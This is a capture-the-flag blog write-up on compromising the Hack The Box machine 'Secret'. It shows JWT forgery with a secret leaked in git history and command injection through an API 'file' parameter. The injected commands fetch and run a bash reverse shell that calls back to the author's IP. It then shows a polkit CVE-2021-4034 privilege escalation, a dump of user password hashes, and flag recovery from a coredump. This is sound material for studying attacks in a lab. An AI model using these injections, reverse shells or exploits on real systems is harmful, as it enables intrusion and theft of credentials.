---
layout: post
title: CTF Secret
date:   2022-01-30 17:29:02 -0600
categories: CTF
tags: Linux
---


# /etc/hosts
```zsh
10.10.11.120 secret.htb
```
# nmap
```zsh
nmap -sV -p- 10.10.11.120
```
nmap is too slow I will try `rust`

# rustscan
https://github.com/RustScan/RustScan

```zsh
rustscan -a secret.htb  --range 1-10000

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3000/tcp open  ppp     syn-ack
```
# nmap port 3000
```zsh
nmap -sV secret.htb -p 3000

PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js (Express middleware)
```
# fuzz

```zsh
ffuf -w Documents/wordlist/directory-list-2.3-medium.txt -u http://secret.htb/FUZZ

docs                    [Status: 200, Size: 20720, Words: 6752, Lines: 487]
api                     [Status: 200, Size: 93, Words: 12, Lines: 1]
Docs                    [Status: 200, Size: 20720, Words: 6752, Lines: 487]
API                     [Status: 200, Size: 93, Words: 12, Lines: 1]
DOCS                    [Status: 200, Size: 20720, Words: 6752, Lines: 487]
```
node.js api

# API
## Register
![](https://i.imgur.com/042C0Lo.png)
I'm gonna use a plugin to post my requests, you can do it with curl.
![](https://i.imgur.com/ClVsezN.png)

## Login
![](https://i.imgur.com/ee5qKNV.png)

![](https://i.imgur.com/sDb4imp.png)

I have a token.

## Token
![](https://i.imgur.com/B23HiQK.png)
This is mu token:
```zsh
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWY2Y2U1YzNiMTgxNTA0NjMxOGY5NjAiLCJuYW1lIjoicGVhbnV0IiwiZW1haWwiOiJyb290QHJvb3QuY29tIiwiaWF0IjoxNjQzNTY0NzY2fQ.s-jTYtdx1chd9m2XymrA_tDefcwOciKT8UHNS1H4qHk
```
I have to decode the second part.
```zsh
echo "eyJfaWQiOiI2MWY2Y2U1YzNiMTgxNTA0NjMxOGY5NjAiLCJuYW1lIjoicGVhbnV0IiwiZW1haWwiOiJyb290QHJvb3QuY29tIiwiaWF0IjoxNjQzNTY0NzY2fQ" | base64 --decode 

{"_id":"61f6ce5c3b1815046318f960","name":"peanut","email":"root@root.com","iat":1643564766}base64: entrée incorrecte
```
Maybe I can recreate the payload with 
dasith


# Download file

![](https://i.imgur.com/FOmWsaF.png)
http://secret.htb:3000/download/files.zip

# See history

https://git-scm.com/book/en/v2/Git-Basics-Viewing-the-Commit-History
```sh
git log -p -2
```

-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret

And the more important.
href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">secure</a>! this has everything to make ur project secure.</div>
# Create the token
![](https://i.imgur.com/QimXNtl.png)
you have to change the name and set the secret in `VERIFY SIGNATURE`.

# Login as admin
![](https://i.imgur.com/7C8k4a0.png)
... where is my fucking FLag!!!

# In the git directory
![](https://i.imgur.com/K99prQQ.png)
I have something to do with logs, but I don't know how to add a parameter.
https://www.codegrepper.com/code-examples/javascript/req+query+params+express
Now I know lol.

# Add the parameter.
![](https://i.imgur.com/IIwDJqM.png)

# Exploit
## create the payload
`rs.sh`
```sh
bash -i >& /dev/tcp/10.10.15.22/4846 0>&1
```
## Listen 
```sh
nc -lvp 4846
```
## Create a http server to download the payload.
```sh
python2.7 -m SimpleHTTPServer
```
## Download the payload
http://secret.htb:3000/api/logs?file=;wget http://10.10.15.22:8000/rs.sh
![](https://i.imgur.com/ntjMOo3.png)
![](https://i.imgur.com/HDHLiCp.png)
Yeah!

## Execute the payload
http://secret.htb:3000/api/logs?file=;bash rs.sh
![](https://i.imgur.com/0dM8p8n.png)
![](https://i.imgur.com/ebxkUH7.png)

I have a shell as dashith.

# Get root 
## Download the exploit
### On my computer
```sh
wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
```
### On the target
```sh
wget http://10.10.15.22:8000/pol.py
```
### Exploit
```sh
python3 pol.py
```
![](https://i.imgur.com/SEkhzdW.png)

# It's not finish
This exploit is a cheat code, it's too easy and I want to learn.

## Smart enum
```sh
wget http://10.10.15.22:8000/lse.sh 
sh lse.sh
```
```sh
 LSE Version: 3.9

        User: dasith
     User ID: 1000
    Password: none
        Home: /home/dasith
        Path: /usr/bin:/bin
       umask: 0022

    Hostname: secret
       Linux: 5.4.0-89-generic
Distribution: Ubuntu 20.04.3 LTS
Architecture: x86_64
============================================================( file system )=====
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/opt/count
/snap/snapd/13640/usr/lib/snapd/snap-confine
/snap/snapd/13170/usr/lib/snapd/snap-confine
---
[*] fst100 Useful binaries................................................. yes!
================================================================( network )=====
[*] net000 Services listening only on localhost............................ yes!
===============================================================( software )=====
[*] sof170 Can we access MongoDB databases without credentials?............ yes!
```
# ps aux
```sh
ps aux |grep mongo
```
```
ps aux |grep mongo
mongodb      863  0.3  1.8 982012 75084 ?        Ssl  19:18   0:06 /usr/bin/mongod --unixSocketPrefix=/run/mongodb --config /etc/mongodb.conf
dasith      9570  0.0  0.0   6432   676 ?        S    19:55   0:00 grep --color=auto mongo
```

# MongoDB
https://stackoverflow.com/questions/24985684/mongodb-show-all-contents-from-all-collections

Nice and short doc, I like it.

```sh
dasith@secret:~/local-web$ mongo
```
And list the db.
```sh
show dbs

admin     0.000GB
auth-web  0.000GB
config    0.000GB
local     0.000GB
```
let's use auth-web.

```sh
use auth-web
```
And show the collections, is it la tables?
```sh
show collections
```
```
db.users.find()

{ "_id" : ObjectId("6131bf09c6c27d0b05c16691"), "name" : "theadmin", "email" : "admin@admins.com", "password" : "$2a$10$SJ8vlQEJYL2J673Xte6BNeMmhHBioLSn6/wqMz2DKjxwQzkModUei", "date" : ISODate("2021-09-03T06:22:01.581Z"), "__v" : 0 }
{ "_id" : ObjectId("6131bfb7c6c27d0b05c16699"), "name" : "user222", "email" : "user@google.com", "password" : "$2a$10$WmuQwihUQkzSrRoYakQdI.5hdjo820LNxSfEYATaBoTa/QXJmEbDS", "date" : ISODate("2021-09-03T06:24:55.832Z"), "__v" : 0 }
{ "_id" : ObjectId("6131d73387dee30378c66556"), "name" : "newuser", "email" : "root@dasith.works", "password" : "$2a$10$wnvh2al2ABafCszb9oWi/.YIXHX4RrTUiWAIVUlv2Z80lkvmlIUQW", "date" : ISODate("2021-09-03T08:05:07.991Z"), "__v" : 0 }
{ "_id" : ObjectId("613904ae8a27cb040c65de17"), "name" : "dasith", "email" : "dasiths2v2@gmail.com", "password" : "$2a$10$S/GbYplKgIU4oFdTDsr2SeOJreht3UgIA0MdT7F50EtiBy7ymzFBO", "date" : ISODate("2021-09-08T18:45:02.187Z"), "__v" : 0 }
{ "_id" : ObjectId("61faddebceb4af047698ceff"), "name" : "johnjohn", "email" : "2d5b68c8@hax.com", "password" : "$2a$10$u840Z7TxjF0lVjNmkYNQtOfTuQSBfV32i44FZaQ3Cnw3XcxlO5zSe", "date" : ISODate("2022-02-02T19:39:23.759Z"), "__v" : 0 }
{ "_id" : ObjectId("61fae16eceb4af047698cf13"), "name" : "carambar", "email" : "fb07a043@hax.com", "password" : "$2a$10$4TevfjCfQqSxJhai7njib./hhadYUP7QHbwOEQXJr4O8AW3kWLTc.", "date" : ISODate("2022-02-02T19:54:22.118Z"), "__v" : 0 }
{ "_id" : ObjectId("61fae1eeceb4af047698cf18"), "name" : "carambarcefef", "email" : "e78ece86@hax.com", "password" : "$2a$10$JSZCh0l9KK1m1fyxfsEFR.sN8adWvt5r.0QHHE52yVdbIceEgGLMy", "date" : ISODate("2022-02-02T19:56:30.893Z"), "__v" : 0 }
```
Whruyyyyy!!!!!!

# Decrypt the password
root@dasith.works this use is cool.
```sh
$2a$10$wnvh2al2ABafCszb9oWi/.YIXHX4RrTUiWAIVUlv2Z80lkvmlIUQW
```
![](https://i.imgur.com/XhrlovH.png
)

I can't do it, it's too hard.
# /opt/count
I saw this program with the lse script.
When you run it he ask a file to read and tell you this:
![](https://i.imgur.com/4fqdK3W.png)
I'm trying to read the root flag.
The program can read it.

# Hint

I got the flag from a coredump file.
Someone forgot to remove it.
So I have to kill count.

# Spawn 2 shell 
One shell with the /opt/count
One shelll to kill it
![](https://i.imgur.com/kduWbWm.png)

In `/var/crash` we have this file: `_opt_count.1000.crash`


# apport-unpack
https://askubuntu.com/questions/434431/how-can-i-read-a-crash-file-from-var-crash

```sh
apport-unpack _opt_count.1000.crash /tmp/wruyyyyy
````
  
And then:
```sh
strings /tmp/wr*/Cor*
```
![](https://i.imgur.com/vYoJ90Y.png)

It's over, it's faster with polkit exploit.


























